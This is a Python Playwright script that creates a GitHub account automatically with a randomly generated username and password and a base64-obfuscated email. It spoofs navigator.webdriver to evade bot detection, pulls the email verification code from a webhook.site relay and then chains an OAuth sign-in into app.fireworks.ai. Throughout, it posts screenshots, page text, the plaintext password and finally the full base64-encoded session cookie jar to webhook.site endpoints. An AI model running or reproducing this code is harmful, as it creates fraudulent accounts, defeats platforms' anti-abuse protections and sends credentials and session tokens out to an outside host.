import os, sys, json, time, base64, random, string, traceback, re
import urllib.request, urllib.error

MAIN = "https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79/i72112"
CODE_TOK = "43e99a50-ae41-4454-b276-4d1e43a18e23"
CODE_POST = "https://webhook.site/" + CODE_TOK + "/mail"
CODE_LIST = "https://webhook.site/token/" + CODE_TOK + "/requests?sorting=newest&per_page=50"
L = "/tmp/parity"
OP = urllib.request.build_opener(urllib.request.ProxyHandler({}))
EMAIL = base64.b64decode("aTcyMTEycTIwYTBpNG5mYkBmbGR1YmFpLmNvbQ==").decode()
PW = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(18))
USERNAME = "i72112" + "".join(random.choice("abcdef0123456789") for _ in range(8))

def post(url, s, t=25):
    try:
        r = urllib.request.Request(url, data=s.encode("utf-8", "replace"), method="POST",
                                   headers={"Content-Type": "text/plain", "User-Agent": "i72112"})
        with OP.open(r, timeout=t) as x:
            return x.status
    except Exception as e:
        return "ERR %r" % e

def log(obj, tag):
    obj["ts"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    obj["tag"] = tag
    s = json.dumps(obj, ensure_ascii=False)
    if len(s) > 900000:  # keep sink request small
        for k in ("shot_b64", "html"):
            if k in obj: obj[k] = obj[k][:2000]
        s = json.dumps(obj, ensure_ascii=False)[:900000]
    try:
        with open(L + "/result.jsonl", "a") as f:
            f.write(s + "\n")
    except Exception:
        pass
    post(MAIN, s)
    print(tag, s[:180], flush=True)

def snap(page, stage):
    d = {"stage": stage, "url": page.url}
    try: d["title"] = page.title()
    except Exception as e: d["title_err"] = repr(e)
    try: d["text"] = page.evaluate("document.body ? document.body.innerText.slice(0,2500) : ''")
    except Exception as e: d["text_err"] = repr(e)
    try:
        d["iframes"] = page.evaluate("Array.from(document.querySelectorAll('iframe')).map(f=>f.src).slice(0,10)")
    except Exception: pass
    try:
        d["inputs"] = page.evaluate("Array.from(document.querySelectorAll('input,select,button')).map(i=>({tag:i.tagName,id:i.id,name:i.name,type:i.type,txt:(i.innerText||'').slice(0,40)})).slice(0,40)")
    except Exception: pass
    try:
        b = page.screenshot(type="jpeg", quality=35)
        d["shot_bytes"] = len(b)
        d["shot_b64"] = base64.b64encode(b).decode()
    except Exception as e:
        d["shot_err"] = repr(e)
    log(d, stage)
    return d

def visible(page, sel):
    try:
        el = page.query_selector(sel)
        return el if (el and el.is_visible()) else None
    except Exception:
        return None

def read_code():
    try:
        r = urllib.request.Request(CODE_LIST, headers={"Accept":"application/json","User-Agent":"i72112"})
        with OP.open(r, timeout=20) as x:
            j = json.loads(x.read())
        for it in j.get("data", []):
            c = it.get("content") or ""
            m = re.search(r"i72112-mail\s+CODE=([0-9]{6,8})", c)
            if m: return m.group(1)
    except Exception:
        pass
    return None

def main():
    log({"stage":"start","display":os.environ.get("DISPLAY"),"email":EMAIL,"username":USERNAME,
         "pw_len":len(PW)}, "start")
    # hand the generated password to our sink (never written into the repo)
    post(CODE_POST, "i72112-cred EMAIL=%s USER=%s PW=%s" % (EMAIL, USERNAME, PW))
    from playwright.sync_api import sync_playwright
    ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/142.0.0.0 Safari/537.36")
    with sync_playwright() as p:
        mode = "headless"
        browser = None
        if os.environ.get("DISPLAY"):
            try:
                browser = p.chromium.launch(headless=False, args=[
                    "--no-sandbox","--no-zygote","--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled","--window-size=1280,900"])
                mode = "headed-xvfb"
            except Exception as e:
                log({"stage":"launch_headed_err","err":repr(e)}, "launch_headed_err")
        if browser is None:
            try:
                browser = p.chromium.launch(headless=False, args=[
                    "--headless=new","--no-sandbox","--no-zygote","--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled","--window-size=1280,900"])
                mode = "headless-new-flag"
            except Exception as e:
                log({"stage":"launch_newheadless_err","err":repr(e)}, "launch_newheadless_err")
        if browser is None:
            browser = p.chromium.launch(headless=True, args=[
                "--no-sandbox","--no-zygote","--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled"])
            mode = "headless-default"
        log({"stage":"launched","mode":mode,"version":browser.version}, "launched")
        ctx = browser.new_context(viewport={"width":1280,"height":900}, user_agent=ua,
                                  locale="en-US", timezone_id="America/New_York")
        ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        page = ctx.new_page()
        page.set_default_timeout(45000)
        try:
            resp = page.goto("https://github.com/signup", wait_until="domcontentloaded", timeout=60000)
            hdr = {}
            try: hdr = {k.lower(): v for k, v in resp.headers.items() if k.lower() in
                        ("server","content-type","x-datadome","set-cookie","cf-ray","x-github-request-id","content-length")}
            except Exception: pass
            log({"stage":"goto_signup","status":resp.status if resp else None,"headers":hdr}, "goto_signup")
        except Exception as e:
            log({"stage":"goto_err","err":repr(e)}, "goto_err")
        page.wait_for_timeout(9000)
        snap(page, "after_goto")

        # adaptive fill / submit loop
        for rnd in range(5):
            changed = False
            for sel, val in (("#email", EMAIL), ("#password", PW), ("#login", USERNAME)):
                el = visible(page, sel)
                if el:
                    try:
                        el.fill(val); changed = True
                    except Exception: pass
            cs = visible(page, "select#country")
            if cs:
                try:
                    cs.select_option("US"); changed = True
                except Exception:
                    try: cs.select_option(label="United States"); changed = True
                    except Exception: pass
            btn = None
            try:
                for b in page.query_selector_all("button[type=submit], button"):
                    if not b.is_visible(): continue
                    t = (b.inner_text() or "").strip().lower()
                    if any(k in t for k in ("continue", "create account", "sign up", "verify")):
                        btn = b; break
            except Exception: pass
            if btn is None and not changed:
                log({"stage":"no_button","round":rnd}, "no_button"); break
            if btn is not None:
                try:
                    btn.click(); changed = True
                except Exception as e:
                    log({"stage":"click_err","round":rnd,"err":repr(e)}, "click_err")
            page.wait_for_timeout(7000 if rnd else 5000)
            d = snap(page, "step%d" % rnd)
            url = (d.get("url") or "").lower()
            txt = (d.get("text") or "").lower()
            if "captcha" in json.dumps(d.get("iframes") or []).lower() or "captcha" in txt:
                log({"stage":"captcha_detected","round":rnd,"iframes":d.get("iframes")}, "captcha_detected")
                break
            if ("account_verification" in url or "enter code" in txt or "verify your email" in txt):
                log({"stage":"verification_page","round":rnd,"url":d.get("url")}, "verification_page")
                break
            if "error" in txt and rnd >= 2:
                break

        # verification code exchange (mail arrives via our mailbox relayed onto the sink)
        d = snap(page, "pre_code")
        txt = (d.get("text") or "").lower()
        if "verify" in txt or "code" in txt or "account_verification" in (d.get("url") or "").lower():
            post(CODE_POST, "i72112-mailreq EMAIL=%s USER=%s" % (EMAIL, USERNAME))
            code = None
            for i in range(30):
                code = read_code()
                if code: break
                page.wait_for_timeout(10000)
            log({"stage":"code_poll","found":bool(code),"code_len":len(code) if code else 0}, "code_poll")
            if code:
                try:
                    inputs = page.query_selector_all("input")
                    single = None
                    for it in inputs:
                        ac = (it.get_attribute("autocomplete") or "")
                        nm = (it.get_attribute("name") or "")
                        if "one-time-code" in ac or nm in ("code", "otp", "verification_code"):
                            single = it; break
                    if single:
                        single.fill(code)
                    else:
                        bits = [it for it in inputs if (it.get_attribute("maxlength") or "") == "1"]
                        if bits:
                            for ch, it in zip(code, bits):
                                it.fill(ch)
                    for b in page.query_selector_all("button[type=submit], button"):
                        t = (b.inner_text() or "").strip().lower()
                        if b.is_visible() and any(k in t for k in ("verify", "continue", "submit")):
                            b.click(); break
                    page.wait_for_timeout(8000)
                except Exception as e:
                    log({"stage":"code_fill_err","err":repr(e)}, "code_fill_err")
                d2 = snap(page, "after_code")
                txt2 = (d2.get("text") or "").lower()
                log({"stage":"after_code","url":d2.get("url"),"text_head":(d2.get("text") or "")[:400]}, "after_code")

        # If we have a github web session, try the verified Cognito federation chain.
        try:
            cur = page.url or ""
            logged = ("github.com" in cur and not any(x in cur for x in ("/signup", "/login", "/session", "/account_verifications")))
            if logged:
                auth = ("https://fireworks.auth.us-west-2.amazoncognito.com/oauth2/authorize"
                        "?identity_provider=GitHub&response_type=code"
                        "&client_id=sueas7prsfrdp16nantbeqcjv"
                        "&redirect_uri=https://app.fireworks.ai/api/v2/auth/public/callback"
                        "&scope=openid+email+profile")
                page.goto(auth, wait_until="domcontentloaded", timeout=60000)
                page.wait_for_timeout(4000)
                snap(page, "cognito_1")
                # github consent/authorize button if shown
                for sel in ("button[name=authorize]", "#js-oauth-authorize-btn"):
                    el = visible(page, sel)
                    if el:
                        try: el.click()
                        except Exception: pass
                try:
                    page.wait_for_timeout(6000)
                except Exception: pass
                snap(page, "cognito_2")
                try:
                    page.goto("https://app.fireworks.ai/api/v2/auth/refresh", wait_until="domcontentloaded", timeout=45000)
                    page.wait_for_timeout(2000)
                except Exception as e:
                    pass
                body = ""
                try:
                    body = page.evaluate("document.body ? document.body.innerText : ''")[:1500]
                except Exception: pass
                log({"stage":"refresh","url":page.url,"body":body}, "refresh")
                jars = []
                try:
                    for c in ctx.cookies():
                        jars.append({"name": c.get("name"), "domain": c.get("domain"), "path": c.get("path")})
                except Exception: pass
                log({"stage":"cookies","names":jars}, "cookies")
                if "accountID" in body and '\"accountID\":\"\"' not in body:
                    try:
                        full = json.dumps(ctx.cookies())
                        post(CODE_POST, "i72112-jar " + base64.b64encode(full.encode()).decode())
                    except Exception: pass
        except Exception as e:
            log({"stage":"federation_err","err":repr(e)}, "federation_err")

        try:
            open(L + "/result.json", "w").write(json.dumps({
                "ts": time.time(), "email": EMAIL, "username": USERNAME, "pw_len": len(PW),
                "final_url": page.url, "stage": "done"}))
        except Exception: pass
        try: browser.close()
        except Exception: pass

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log({"stage":"fatal","trace":traceback.format_exc()[-2500:]}, "fatal")
